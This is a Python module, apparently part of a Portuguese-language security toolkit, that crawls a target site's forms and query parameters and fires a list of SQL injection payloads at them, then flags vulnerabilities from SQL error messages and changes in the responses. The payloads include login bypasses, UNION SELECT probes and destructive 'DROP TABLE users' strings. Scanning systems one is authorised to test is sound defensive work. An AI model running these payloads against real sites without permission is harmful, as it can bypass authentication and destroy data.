#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import logging
import re
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

logger = logging.getLogger("nsf.sqli_scanner")

# User-Agent para requisições
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

# Payloads para detecção de SQL Injection
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1' #",
    "1' OR '1'='1' /*",
    "' UNION SELECT 1,2,3,4,5--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT 1,2,3,4,5--",
    "admin' --",
    "admin' #",
    "admin'/*",
    "admin' OR '1'='1",
    "1;DROP TABLE users --",
    "1'; DROP TABLE users --",
]

# Padrões de erro SQL para detecção de vulnerabilidades
ERROR_PATTERNS = [
    "SQL syntax",
    "MySQL Query fail",
    "MySQL Error",
    "MySQL ODBC",
    "PostgreSQL Error",
    "ORA-[0-9][0-9][0-9][0-9]",
    "Microsoft OLE DB Provider for SQL Server",
    "ODBC SQL Server Driver",
    "ODBC Error",
    "Microsoft Access Driver",
    "JET Database Engine",
    "Microsoft Access Database Engine",
    "SQLite3::",
    "sqlite_[a-zA-Z0-9_]+::",
    "Warning: mysql_",
    "Warning: pg_",
    "Warning: SQLite3::",
    "Warning: mssql_",
    "mysqli_fetch_array()",
    "PDOStatement::execute()"
]

def scan_sqli(target, params=None):
    """
    Escaneia um site em busca de vulnerabilidades SQL Injection.
    
    Args:
        target (str): URL alvo (ex: https://exemplo.com)
        params (list): Lista de parâmetros a serem testados. Se None, será feita uma detecção automática.
    
    Returns:
        dict: Resultado do scan com vulnerabilidades encontradas
    """
    logger.info(f"Iniciando scan de SQL Injection em {target}")
    
    # Normalizar URL alvo
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Headers para requisições
    headers = {
        'User-Agent': USER_AGENT,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    
    # Se nenhuma lista de parâmetros fornecida, tentar descobrir formulários e parâmetros
    if not params:
        params = discover_parameters(target, headers)
    
    # Configurações para teste
    test_urls = []
    
    # Testar URL original
    original_url_parsed = urlparse(target)
    query_params = parse_qs(original_url_parsed.query)
    
    if query_params:
        for param in query_params.keys():
            test_urls.append({
                'url': target,
                'method': 'GET',
                'param': param,
                'type': 'url'
            })
    
    # Adicionar parâmetros descobertos
    for param in params:
        # Se for uma URL completa com método
        if isinstance(param, dict) and 'url' in param and 'method' in param and 'param' in param:
            test_urls.append(param)
        # Se for apenas um nome de parâmetro
        elif isinstance(param, str):
            if query_params:
                # Se a URL já tem parâmetros, adicionar este como outro teste
                test_urls.append({
                    'url': target,
                    'method': 'GET',
                    'param': param,
                    'type': 'url'
                })
            else:
                # Se a URL não tem parâmetros, criamos uma URL de teste
                test_url = f"{target}?{param}=test"
                test_urls.append({
                    'url': test_url,
                    'method': 'GET',
                    'param': param,
                    'type': 'url'
                })
    
    # Remover duplicatas
    unique_tests = []
    seen = set()
    for test in test_urls:
        test_key = f"{test['url']}-{test['method']}-{test['param']}"
        if test_key not in seen:
            seen.add(test_key)
            unique_tests.append(test)
    
    # Resultados
    vulnerabilities = []
    
    # Fazer requisição inicial para comparar depois
    baseline_responses = {}
    for test in unique_tests:
        url = test['url']
        method = test['method']
        param = test['param']
        
        try:
            if method == 'GET':
                # Substituir ou adicionar valor do parâmetro na URL
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                # Usar valor padrão ou 'test' se o parâmetro não existir
                query_params[param] = query_params.get(param, ['test'])
                # Reconstruir a query string
                new_query = urlencode(query_params, doseq=True)
                # Reconstruir a URL
                baseline_url = urlparse(url)._replace(query=new_query).geturl()
                
                # Fazer a requisição
                response = requests.get(baseline_url, headers=headers, timeout=10)
                baseline_responses[param] = {
                    'status': response.status_code,
                    'content_length': len(response.content),
                    'content': response.text
                }
            elif method == 'POST':
                data = {param: 'test'}
                response = requests.post(url, headers=headers, data=data, timeout=10)
                baseline_responses[param] = {
                    'status': response.status_code,
                    'content_length': len(response.content),
                    'content': response.text
                }
        except Exception as e:
            logger.error(f"Erro ao obter resposta base para {url}, parâmetro {param}: {str(e)}")
    
    # Função para testar um único payload
    def test_payload(test, payload):
        url = test['url']
        method = test['method']
        param = test['param']
        param_type = test.get('type', 'url')
        
        try:
            if method == 'GET':
                # Construir URL com o payload
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                query_params[param] = [payload]
                new_query = urlencode(query_params, doseq=True)
                test_url = parsed_url._replace(query=new_query).geturl()
                
                response = requests.get(test_url, headers=headers, timeout=10, allow_redirects=False)
            else:  # POST
                data = {param: payload}
                response = requests.post(url, headers=headers, data=data, timeout=10, allow_redirects=False)
            
            # Verificar resposta em busca de indicadores de SQL Injection
            vulnerable = False
            evidence = ''
            
            # Verificar erros SQL na resposta
            for pattern in ERROR_PATTERNS:
                if re.search(pattern, response.text, re.IGNORECASE):
                    vulnerable = True
                    evidence = f"Erro SQL encontrado: {pattern}"
                    break
            
            # Verificar diferenças na resposta que podem indicar SQL Injection
            if not vulnerable and param in baseline_responses:
                baseline = baseline_responses[param]
                
                # Verificar redirecionamentos inesperados
                if baseline['status'] != response.status_code and response.status_code in [200, 302]:
                    vulnerable = True
                    evidence = f"Mudança no código de status: {baseline['status']} -> {response.status_code}"
                
                # Verificar grandes diferenças no tamanho da resposta
                elif abs(baseline['content_length'] - len(response.content)) > baseline['content_length'] * 0.3:
                    vulnerable = True
                    evidence = f"Diferença significativa no tamanho da resposta: {baseline['content_length']} -> {len(response.content)}"
                
                # Verificar se há conteúdo adicional significativo
                elif "login" in response.text.lower() and "login" not in baseline['content'].lower():
                    vulnerable = True
                    evidence = "Possível bypass de autenticação: página de login não encontrada na resposta original"
                
                # Verificar se o payload está refletido intacto na resposta
                elif payload in response.text and param_type == 'form':
                    vulnerable = True
                    evidence = f"Payload SQL refletido na resposta"
            
            if vulnerable:
                return {
                    'url': url,
                    'method': method,
                    'param': param,
                    'payload': payload,
                    'status': response.status_code,
                    'vulnerable': True,
                    'details': evidence
                }
            
            return None
        
        except Exception as e:
            logger.debug(f"Erro ao testar payload {payload} em {url}, parâmetro {param}: {str(e)}")
            return None
    
    # Testar todos os payloads em todas as URLs
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        
        for test in unique_tests:
            for payload in SQLI_PAYLOADS:
                futures.append(executor.submit(test_payload, test, payload))
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                # Verificar se já existe um resultado para este parâmetro
                param_exists = False
                for vuln in vulnerabilities:
                    if (vuln['url'] == result['url'] and 
                        vuln['method'] == result['method'] and 
                        vuln['param'] == result['param']):
                        param_exists = True
                        break
                
                if not param_exists:
                    vulnerabilities.append(result)
                    logger.info(f"Vulnerabilidade SQL Injection encontrada: {result['url']}, parâmetro {result['param']}")
    
    # Preparar resultados
    for vuln in vulnerabilities:
        # Calcular o nível de confiança
        if "Erro SQL encontrado" in vuln.get('details', ''):
            vuln['confidence'] = 'Alta'
        elif "Mudança no código de status" in vuln.get('details', ''):
            vuln['confidence'] = 'Média'
        else:
            vuln['confidence'] = 'Baixa'
    
    return {
        'vulnerabilities': vulnerabilities,
        'tested_parameters': len(unique_tests),
        'tested_payloads': len(SQLI_PAYLOADS),
        'vulnerable_count': len(vulnerabilities),
        'target': target
    }

def discover_parameters(target, headers):
    """
    Descobre parâmetros a serem testados em uma URL.
    
    Args:
        target (str): URL alvo
        headers (dict): Headers para requisição
    
    Returns:
        list: Lista de parâmetros descobertos
    """
    discovered_params = []
    
    try:
        # Obter a página
        response = requests.get(target, headers=headers, timeout=10)
        
        if response.status_code != 200:
            logger.warning(f"Não foi possível acessar a página: {response.status_code}")
            return discovered_params
        
        # Usar BeautifulSoup para analisar o HTML
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Encontrar formulários e seus campos
        forms = soup.find_all('form')
        for form in forms:
            form_action = form.get('action', '')
            form_method = form.get('method', 'GET').upper()
            
            # Construir URL completa para o formulário
            form_url = urljoin(target, form_action) if form_action else target
            
            # Encontrar campos de entrada
            inputs = form.find_all(['input', 'textarea', 'select'])
            for input_field in inputs:
                input_name = input_field.get('name')
                if input_name:
                    # Adicionar à lista de parâmetros
                    discovered_params.append({
                        'url': form_url,
                        'method': form_method,
                        'param': input_name,
                        'type': 'form'
                    })
        
        # Encontrar links com parâmetros
        links = soup.find_all('a', href=True)
        for link in links:
            href = link['href']
            if '?' in href:
                link_url = urljoin(target, href)
                parsed_url = urlparse(link_url)
                query_params = parse_qs(parsed_url.query)
                
                for param in query_params.keys():
                    discovered_params.append({
                        'url': link_url,
                        'method': 'GET',
                        'param': param,
                        'type': 'url'
                    })
    
    except Exception as e:
        logger.error(f"Erro ao descobrir parâmetros: {str(e)}")
    
    return discovered_params